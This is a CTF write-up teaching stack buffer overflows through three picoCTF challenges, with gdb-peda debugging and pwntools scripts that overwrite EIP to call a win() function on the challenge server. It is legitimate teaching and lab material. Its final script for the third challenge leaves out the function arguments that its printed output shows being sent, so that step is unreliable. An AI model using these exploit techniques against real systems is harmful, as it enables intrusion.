# Introduction to  Buffer Overflows

Hello! I am `skelet0n` in this series we will be focusing on the basics of the **Buffer Overflow** anomaly and how to exploit it.

So what is a buffer overflow? A buffer overflow is an anomaly whereby a program, while writing [data](https://en.wikipedia.org/wiki/Data_(computing) "Data (computing)") to a [buffer](https://en.wikipedia.org/wiki/Data_buffer "Data buffer"), overruns the buffer's boundary and overwrites adjacent [memory](https://en.wikipedia.org/wiki/Main_memory "Main memory") locations. 
Buffers are areas of memory set aside to hold data, often while moving it from one section of a program to another, or between programs. 
An anomalous transaction that produces more data could cause it to write past the end of the buffer. If this overwrites adjacent data or executable code, this may result in erratic program behavior.
One can exploit the behavior of a buffer overflow, to write malicious data in locations known to hold executable code.

To exploit a buffer overflow we generally use the following road map:

- Overflow the buffer of the vulnerable program
- Find the **EIP offset**
- Create shell code to exploit the program or use a **ret2** based attack

#### EIP (Extended Instruction Pointer)
**EIP** is a pointer that tells the computer where to go next to execute the next instruction and therefore controls the flow of a program.

#### Return Address
The return address causes execution to leave the current subroutine and resume at the point in the code immediately after the instruction who called it. The return address is saved by the calling routine on the stack or in a register (**EIP**)

#### RET2 Attack
When overflowing the buffer important data on the stack are overwritten. One important piece of data that gets overwritten is the **ret**urn address. From the definition above you can understand the importance of it. With that in mind, if we can inject our own malicious return address we can call a function that was never meant to be called.


## Getting our hands dirty

For this series we will be completing some great challenges [picoCTF]() has put together.
Each of these challenges has the same scope although each time the difficulty will be increased (nothing to fear though :D).

# Buffer Overflow 0x0

Let's download the source code and compiled program using `wget` and give execution permissions to the application:

```bash
$ wget https://artifacts.picoctf.net/c/520/vuln.c \
> https://artifacts.picoctf.net/c/520/vuln
[ . . . ]
$ chmod +x vuln
```

## Peeking inside

Before running it let's do some analysis first.
For this we will use the `checksec` tool. You can install it with:

```
$ sudo apt install checksec
```

And use it with:

```bash
$ checksec --file=vuln
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Full RELRO      No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   84 Symbols        No    0               4               vuln
```

We can see that the **NX** bit (no execute) is set. That means we can not inject malicious code (shellcode) because it will simply be ignored.

Now let's examine the source code.

```c
void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}
```

After some quick research “SIGSEGV” stands for a **segmentation fault**, which is an error raised by memory-protected hardware whenever it tries to access a memory address that is either restricted or does not exist.
If the flag `printf()` resides within `sigsegv_handler()`, then we must figure out how to trigger a segmentation fault. Looking to the next function we can assume that this shouldn't be that hard of a problem.

```c
void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}
```

Okay this is exactly what we were talking about. The program will try to store some input into a 16 byte buffer. 
To overflow the program we will use `python2` to generate garbage data that exceed the buffers capacity and pipe them to the application. Before we do that though let's take a look at the `main()` function.

```c
int main(int argc, char **argv){
  
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }
  
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler); // Set up signal handler
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);


  printf("Input: ");
  fflush(stdout);
  char buf1[100];
  gets(buf1); 
  vuln(buf1);
  printf("The program will exit now\n");
  return 0;
}
```

It firstly opens the flag file if present (If you are playing with this on your machine you have to create a dummy `flag.txt` file). 
Then it writes the contents of the file into the flag buffer (don't get excited! If you look closely the function being used is `fgets()`. It is a more secure function that performs checks to avoid buffer overflows. But its great that you noticed it!). 
We see that on line 40,  `gets()` is called, and reads `buf1` (the user input) onto the stack. 
This function sucks from a security perspective, as it will write the user’s input to the stack without regard to its allocated length. 
The program will pass their input into the `vuln()` function to trigger a segmentation fault. let's do that using `python2`

## 🌪 Exploiting

```bash
$ python2 -c "print('A' * 20)" | nc saturn.picoctf.net [PORT]
Input: picoCTF{ov3rfl0ws_ar3nt_that_bad_[REDACTED]}
```

And that's it! You just overflowed your first program :D




# Buffer Overflow 0x1

Once again, we install the required files

```bash
$ wget https://artifacts.picoctf.net/c/250/vuln.c \
> https://artifacts.picoctf.net/c/250/vuln
```

## 📚 Peeking inside

By analyzing the compiled program we can suppose that in the future we will be able to easily obtain and examine the functions since the application is not stripped. We can confirm this by using the `file` command as shown below:

```bash
$ file vuln
vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=96273c06a17ba29a34bdefa9be1a15436d5bad81, for GNU/Linux 3.2.0, not stripped
```

let's take a look at the source code.

```c
#define FLAGSIZE 64

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}
```

The `win()` function tries to read the flag from the file `flag.txt` and prints it to the screen.
Is that it? We just run the program and we get the flag? Im afraid that is not the case.
let's take a look at the remaining functions.

```c
#define BUFSIZE 32

void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}
```

We can see that `vuln()` uses `gets()` to put data from our input to the buffer.
This is quite dangerous since it does not perform checks to prevent buffer overflows. 
Therefore, this is our way in!
Notice the function gives us the return address. let's keep that in mind because it will be usefull for debugging.

```c
int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

Now the `main()` function.
The only thing it does, is print a string to the screen and then call the `vuln()` function.
We can see that `win()` doesn't seem to be called. Well it turns out we will have to dig more than that!

## 🔎 Debugging

Let's fire up `gdb` (**G**nu project **D**e**B**ugger)

> Note that for this writeup we will be using gdb-peda a **P**ython **E**xploit **D**evelopment **A**ssistance for gdb
> Setup with:
> 
> git clone https://github.com/longld/peda.git ~/peda  
   echo "source ~/peda/peda.py" >> ~/.gdbinit


```bash
$ gdb -q vuln
Reading symbols from vuln...
(No debugging symbols found in vuln)
gdb-peda$
```


Now we are creating a string longer than the buffers size (32) to overflow the program.

```bash
gdb-peda$ pattern create 100 pattern.txt
Writing pattern of 100 chars to filename "pattern.txt"
```

And use it as an input for the application

```bash
gdb-peda$ r < pattern.txt
Starting program: /home/skeleton/ctf/pico/binary_exploitation/buffer_overflow_1/vuln < pattern.txt
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x41414641

Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
EAX: 0x41 ('A')
EBX: 0x61414145 ('EAAa')
ECX: 0x0 
EDX: 0xf7fc2540 (0xf7fc2540)
ESI: 0x8049350 (<__libc_csu_init>:      endbr32)
EDI: 0xf7ffcb80 --> 0x0 
EBP: 0x41304141 ('AA0A')
ESP: 0xffffcf10 ("bAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
EIP: 0x41414641 ('AFAA')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41414641
[------------------------------------stack-------------------------------------]
0000| 0xffffcf10 ("bAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0004| 0xffffcf14 ("AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0008| 0xffffcf18 ("AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0012| 0xffffcf1c ("2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0016| 0xffffcf20 ("AAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0020| 0xffffcf24 ("A3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0024| 0xffffcf28 ("IAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0028| 0xffffcf2c ("AA4AAJAAfAA5AAKAAgAA6AAL")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41414641 in ?? ()
```

And we crashed it. Remember, we got to replace the **EIP** with the address of the `win()` function.
To do that we need to overflow the stack just enough to reach the **EIP** and then provide our own.
The **EIP** register is overflowed by the pattern `0x41414641` (`afaa`). let's find the offset of this pattern.

```bash
gdb-peda$ pattern offset 0x41414641
1094796865 found at offset: 44
```

All we have to do now is find the address of the `win()` function and craft the final payload.

```bash
gdb-peda$ x win
0x80491f6 <win>:        0xfb1e0ff
```

Notice that `win` is at `0x80491f6` but we need to convert it in little endian format. This can be done with the pwntools `p32()` function which results to `\xf6\x91\x04\x08` 

## 🐑 Exploitation (Manual)

> Note
> In this writeup I include a **manual** as well as an **automated** way of exploiting buffer overflows. 
> I believe that a beginner should learn how to exploit it manually and then let the heavylifers do the job.

Let's now use the final payload on the original application.

```bash
python2 -c "print(b'A' * 44 + b'\xf6\x91\x04\x08')" | nc saturn.picoctf.net [PORT]
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{addr3ss3s_ar3_3asy_[REDACTED]}
```

## 🦆 Exploitation (Automated)

If you found the above method cool, then trust me this one will excite you :D
We are going to automate the process of crafting and sending the payload. Although to automate this, we still need to understand how its done in the first place.  

> Basic python knowledge is adviced.

For the shake of simplicity we will use `pwntools`, a exploit development python library. It is not part of the standard library so you will need to install it with:

```bash
$ pip3 install --upgrade pwntools
```

Firstly let's add some arguments the user can supply when using our exploit.

```python
from pwn import *
import argparse

parser = argparse.ArgumentParser()

parser.add_argument(
					"--offset", 
					type=int, 
					required=True, 
					help="EIP offset to use."
)

parser.add_argument(
					"--address", 
					type=lambda x: int(x, 0), # This function converts the hexadecimal input to base 10. 
					required=True, 
					help="Address to overwrite the EIP with."
)

parser.add_argument(
	"--host", 
	type=str, 
	default="saturn.picoctf.net", 
	help="Remote host"
)

parser.add_argument(
	"--port",
	type=int,
	required=True, 
	help="Port to use when connecting to remote host."
)

args = parser.parse_args()
```

Now let's finally use `pwntools` to craft the payload.

```python
payload = b"A" * args.offset + p32(args.address) # Create a padding using garbage data and apply Little endian to the given address.
```

let's use `pwntools` once again to establish a connection to the remote host and send the payload (we will also log what gets outputted from the host's side).

```python
host, port = args.host, args.port

conn = remote(host, port)
log.info(conn.recvS())
conn.sendline(payload) # We send the payload
log.success(conn.recvallS())
conn.close()
```

Let's try running the script on the server:

```bash
$ python exploit.py --port=[PORT] --offset 44 --address=0x80491f6
[+] Opening connection to saturn.picoctf.net on port 65512: Done
[*] Please enter your string: 
[+] Receiving all data: Done (100B)
[*] Closed connection to saturn.picoctf.net port 65512
[+] Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
    picoCTF{addr3ss3s_ar3_3asy_[REDACTED]}
```

And we get the flag! Isn't that awesome? 
From now on we will be using python in order to exploit the buffer overflows.

## 🌪Exploiting (Automated II)

We will now complete the exploit by automating the process of getting the **EIP** offset. 
For this we will use `pwntools` to parse `core dump` files, which are generated by Linux whenever errors occur during a running process. They contain lots of
First, let's generate an `elf` object using pwntool's `ELF()` class

```python
from pwn import *

elf = context.binary = ELF('./vuln')
```

Afterwards we generate a `cyclic()` payload and start a local process referencing the `elf` object. If we use the `.wait()` method a segmentation fault will occur and hence a core dump will be generated.

```python
p = process(elf.path)
p.sendline(cyclic(100))
p.wait()
```

Now we can run the exploit and see the core file being generated:

```bash
$ python exploit.py
[*] '/home/skeleton/ctf/pico/binary_exploitation/buffer_overflow_1/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    **********NX**********:       **********NX********** disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
[+] Starting local process '/home/skeleton/ctf/pico/binary_exploitation/buffer_overflow_1/vuln': pid 5906
[*] Process '/home/skeleton/ctf/pico/binary_exploitation/buffer_overflow_1/vuln' stopped with exit code -11 (SIGSEGV) (pid 5906)
$ ls
core  exploit.py  flag.txt  pattern.txt  vuln  vuln.c
```

That worked. We can now use the `Coredump()` class to parse the core file. Afterwards we can get the **EIP** as well as the address of our `win()` function. To craft the final payload we will now use `flat()`, a function that flattens arguments into a string.

```python
core = Coredump('./core')

payload = flat({
	cyclic_find(core.eip): elf.symbols.win
})
```

And now we need to do some slight modifications to our original exploits and we should be good to go. 
I made the `HOST, PORT` arguments optional so that we can also play with this on our host machine.

```python
from pwn import *
import argparse

parser = argparse.ArgumentParser()

parser.add_argument(
	"--host", 
	type=str, 
	default="saturn.picoctf.net", 
	help="Remote host"
)

parser.add_argument(
	"--port",
	type=int,
	help="Port to use when connecting to remote host."
)

args = parser.parse_args()

elf = context.binary = ELF('./vuln')

p = process(elf.path)
p.sendline(cyclic(100))
p.wait()

core = Coredump('./core')

payload = flat({
	cyclic_find(core.eip): elf.symbols.win
})

if args.host and args.port:
	p = remote(args.host, args.port)
else:
	p = process(elf.path)

p.sendline(payload) # send the payload
p.interactive()
```

Now let's run it.

```bash
$ python exploit.py --host saturn.picoctf.net --port [PORT]
[*] '/home/skeleton/ctf/pico/binary_exploitation/buffer_overflow_1/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    **********NX**********:       **********NX********** disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
[+] Starting local process '/home/skeleton/ctf/pico/binary_exploitation/buffer_overflow_1/vuln': pid 12010
[*] Process '/home/skeleton/ctf/pico/binary_exploitation/buffer_overflow_1/vuln' stopped with exit code -11 (SIGSEGV) (pid 12010)
[+] Parsing corefile...: Done
[*] '/home/skeleton/ctf/pico/binary_exploitation/buffer_overflow_1/core'
    Arch:      i386-32-little
    EIP:       0x6161616c
    ESP:       0xffb1f300
    Exe:       '/home/skeleton/ctf/pico/binary_exploitation/buffer_overflow_1/vuln' (0x8048000)
    Fault:     0x6161616c
[+] Opening connection to saturn.picoctf.net on port [PORT]: Done
[*] Switching to interactive mode
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{addr3ss3s_ar3_3asy_[REDACTED]}
[*] Got EOF while reading in interactive
```


# Buffer Overflow 0x2

We install the required files:

```bash
$ wget https://artifacts.picoctf.net/c/344/vuln.c \
> https://artifacts.picoctf.net/c/344/vuln
```

## 📚 Peeking Inside

We can now examine the file

```bash
$ ch ecksec --file=vuln
RELRO          STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   77 Symbols        No    0               3               vuln
```

We see that the **NX** bit (no execute) is set. That means we can not inject malicious code (shell code) because it will simply be ignored. Therefore we can try a `ret2` based attack. Now let's hope the binary is not stripped.

```bash
$ file vuln
vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=1c57f0cbd109ed51024baf11930a5364186c28df, for GNU/Linux 3.2.0, not stripped
```

Okay, that's great.
Now let's  peek through the source code.

```c
#define FLAGSIZE 64

void win(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xCAFEF00D)
    return;
  if (arg2 != 0xF00DF00D)
    return;
  printf(buf);
}
```

We can see that the `win()` function takes two arguments (`arg1`, `arg2` ). 
It opens the file `flag.txt` and stores its contents to a buffer.
It then performs some checks on the arguments.
If either of the checks fail the function returns without ever printing the flag. Therefore our goal is to call `win(0xCAFEF00D, 0xF00DF00D)`.

What about the other functions?
The next function is `vuln()`. 
This is what will allow us to perform a buffer overflow and overwrite the stack.

```c
#define BUFSIZE 100
[ . . . ]
void vuln(){
  char buf[BUFSIZE];
  gets(buf);
  puts(buf);
}
```
Now the `main()` function.
We can see that we are asked for an input that gets passed to the `vuln()` function (remember `vuln()` uses `gets()` to put the data in the buffer. `gets()` does not perform checks to avoid buffer overflows so this is our way in.

## 🔎 Debugging

We will use what we learnt from the previous challenge to automatically overwrite the **EIP**.

```python
from pwn import *

elf = context.binary = ELF('./vuln')

p = process(elf.path)
p.sendline(cyclic(200)) # Cause SIGSEGV
p.wait()

core = Coredump('./core') # Parse the core file
log.info(f"EIP: {core.eip}")
log.info(f"win: {elf.symbols.win}")

payload = flat({
	cyclic_find(core.eip): elf.symbols.win # Pad the win address
})

log.info(f"Payload: {payload}")
```

```bash
$ python exploit.py
[*] '/home/skeleton/ctf/pico/binary_exploitation/buffer_overflow_2/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process '/home/skeleton/ctf/pico/binary_exploitation/buffer_overflow_2/vuln': pid 96975
[*] Process '/home/skeleton/ctf/pico/binary_exploitation/buffer_overflow_2/vuln' stopped with exit code -11 (SIGSEGV) (pid 96975)
[+] Parsing corefile...: Done
[*] '/home/skeleton/ctf/pico/binary_exploitation/buffer_overflow_2/core'
    Arch:      i386-32-little
    EIP:       0x62616164
    ESP:       0xff8e6b30
    Exe:       '/home/skeleton/ctf/pico/binary_exploitation/buffer_overflow_2/vuln' (0x8048000)
    Fault:     0x62616164
[*] EIP: 1650549092
[*] win: 134517398
[*] Payload: b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaab\x96\x92\x04\x08'
```

With this simple script we just saved a lot of time. Now why don't we see the affect of this payload we generated in action? We will use gdb to setup a breakpoint at the `win()` function and see if it gets called when we use our payload.

```bash
$ gdb -q vuln
Reading symbols from vuln...
(No debugging symbols found in vuln)
gdb-peda$ b *win
Breakpoint 1 at 0x8049296
```

```bash
gdb-peda$ r < pattern.txt
Starting program: /home/skeleton/ctf/pico/binary_exploitation/buffer_overflow_2/vuln < pattern.txt
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Please enter your string: 
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaab��

[----------------------------------registers-----------------------------------]
EAX: 0x75 ('u')
EBX: 0x62616162 ('baab')
ECX: 0xf7e1e9b8 --> 0x0 
EDX: 0x1 
ESI: 0x80493f0 (<__libc_csu_init>:      endbr32)
EDI: 0xf7ffcb80 --> 0x0 
EBP: 0x62616163 ('caab')
ESP: 0xffffcf00 (0xffffcf00)
EIP: 0x8049296 (<win>:  endbr32)
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8049289 <__do_global_dtors_aux+41>:        lea    esi,[esi+eiz*1+0x0]
   0x8049290 <frame_dummy>:     endbr32 
   0x8049294 <frame_dummy+4>:   jmp    0x8049220 <register_tm_clones>
=> 0x8049296 <win>:     endbr32 
   0x804929a <win+4>:   push   ebp
   0x804929b <win+5>:   mov    ebp,esp
   0x804929d <win+7>:   push   ebx
   0x804929e <win+8>:   sub    esp,0x54
[------------------------------------stack-------------------------------------]
0000| 0xffffcf00 (0xffffcf00)
0004| 0xffffcf04 --> 0xf7fc1678 --> 0xf7ffdbac --> 0xf7fc1790 --> 0xf7ffda40 --> 0x0 
0008| 0xffffcf08 --> 0xf7fc1b40 --> 0xf7c1f2bc ("GLIBC_PRIVATE")
0012| 0xffffcf0c --> 0x3e8 
0016| 0xffffcf10 --> 0xffffcf30 --> 0x1 
0020| 0xffffcf14 --> 0xf7e1cff4 --> 0x21cd8c 
0024| 0xffffcf18 --> 0x0 
0028| 0xffffcf1c --> 0xf7c23295 (add    esp,0x10)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x08049296 in win ()
```

Great!  We in fact call the `win()` function.
Now we need to pass in the required parameters.
Here's how functions are laid out on the stack.

![stack layout](https://manybutfinite.com/img/stack/stackIntro.png)

We can see that to call a function with parameters, we need to include the `EBP` register (base pointer) alongside a return address. This can simply be `main()`. 

Let's manipulate our exploit to find the address of  the main function and include it in our payload.

```python
log.info(f"MAIN: {elf.symbols.main}")
[ . . . ]
payload = flat(
	{cyclic_find(core.eip): elf.symbols.win},
	elf.symbols.main # return address
)
[ . . . ]
```

```bash
$ python exploit.py
[ . . . ]
[*] EIP: 1650549092
[*] win: 134517398
[*] main: 134517618
[+] Written payload in pattern.txt
```

Alright. Now to understand a bit more about what is happening under the hood when we use this payload, we can use `gdb`. 
Let's again set a breakpoint at our `win()` function.

```bash
$ gdb -q vuln
Reading symbols from vuln...
(No debugging symbols found in vuln
gdb-peda$ b *win
Breakpoint 1 at 0x8049296
```

Now we run the program with our payload as input and use the `ni` (next instruction) command to move at the `ret` instruction.

```bash
gdb-peda$ ni
[ . . . ]
[-------------------------------------code-------------------------------------]
   0x8049332 <win+156>: nop
   0x8049333 <win+157>: mov    ebx,DWORD PTR [ebp-0x4]
   0x8049336 <win+160>: leave  
=> 0x8049337 <win+161>: ret    
   0x8049338 <vuln>:    endbr32 
   0x804933c <vuln+4>:  push   ebp
   0x804933d <vuln+5>:  mov    ebp,esp
   0x804933f <vuln+7>:  push   ebx
[------------------------------------stack-------------------------------------]
0000| 0xffffcf00 --> 0x8049372 (<main>: endbr32)
0004| 0xffffcf04 --> 0xf7fc1600 --> 0xf7c00034 --> 0x6 
0008| 0xffffcf08 --> 0xf7fc1b40 --> 0xf7c1f2bc ("GLIBC_PRIVATE")
0012| 0xffffcf0c --> 0x3e8 
0016| 0xffffcf10 --> 0xffffcf30 --> 0x1 
0020| 0xffffcf14 --> 0xf7e1cff4 --> 0x21cd8c 
0024| 0xffffcf18 --> 0x0 
0028| 0xffffcf1c --> 0xf7c23295 (add    esp,0x10)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x08049337 in win ()
```

Notice that we push the address of the `main()` function on the top of the stack thanks to our payload. 
Can you guess what will happen if we hit `ni` again? Exactly! The program will jump back at the `main()` function.
We are almost there. Now all thats left to do is supply the arguments via our payload.

## 🌪 Exploiting (Automated)

To craft our final exploit we will apply a lot of the things we learnt in the second writeup of these series.

```python
from pwn import *
import argparse

parser = argparse.ArgumentParser()

parser.add_argument(
	"--host", 
	type=str, 
	default="saturn.picoctf.net", 
	help="Remote host"
)

parser.add_argument(
	"--port",
	type=int,
	help="Port to use when connecting to remote host."
)

args = parser.parse_args()

elf = context.binary = ELF('./vuln')

p = process(elf.path)
p.sendline(cyclic(200)) # Cause SIGSEGV
p.wait()

core = Coredump('./core') # Parse the core file
log.info(f"EIP: {core.eip}")
log.info(f"win: {elf.symbols.win}")
log.info(f"main: {elf.symbols.main}")

payload = flat(
	{cyclic_find(core.eip): elf.symbols.win},
	elf.symbols.main # return address
)

if args.host and args.port:
	p = remote(args.host, args.port)
else:
	p = process(elf.path)

p.sendline(payload) # send the payload
p.interactive()
```

```bash
$ python exploit.py --host saturn.picoctf.net --port [PORT]
[*] '/home/skeleton/ctf/pico/binary_exploitation/buffer_overflow_2/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process '/home/skeleton/ctf/pico/binary_exploitation/buffer_overflow_2/vuln': pid 123274
[*] Process '/home/skeleton/ctf/pico/binary_exploitation/buffer_overflow_2/vuln' stopped with exit code -11 (SIGSEGV) (pid 123274)
[+] Parsing corefile...: Done
[*] '/home/skeleton/ctf/pico/binary_exploitation/buffer_overflow_2/core'
    Arch:      i386-32-little
    EIP:       0x62616164
    ESP:       0xffcdd4c0
    Exe:       '/home/skeleton/ctf/pico/binary_exploitation/buffer_overflow_2/vuln' (0x8048000)
    Fault:     0x62616164
[*] EIP: 1650549092
[*] win: 134517398
[*] main: 134517618
[+] Payload generated
[+] Opening connection to saturn.picoctf.net on port 56095: Done
[*] Switching to interactive mode
Please enter your string: 
\xf0\xfe\xcadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaab\x96\x92\x04r\x93\x04
picoCTF{argum3nt5_4_d4yZ_[REDACTED]}Please enter your string:
```
# Buffer Overflow 0x3
According to `picoCTF` this challenge is under maintenance. 
**Comming soon**
# The end
I really hope you enjoyed this writeup and learnt a thing or two about buffer overflows and how to exploit them. 
Please give a star to this repository if you liked it.  It only takes 1 **GET** request to do and you will motivate me to keep making these.
Now if you didn't, feel free to open a issue. 

skelet0n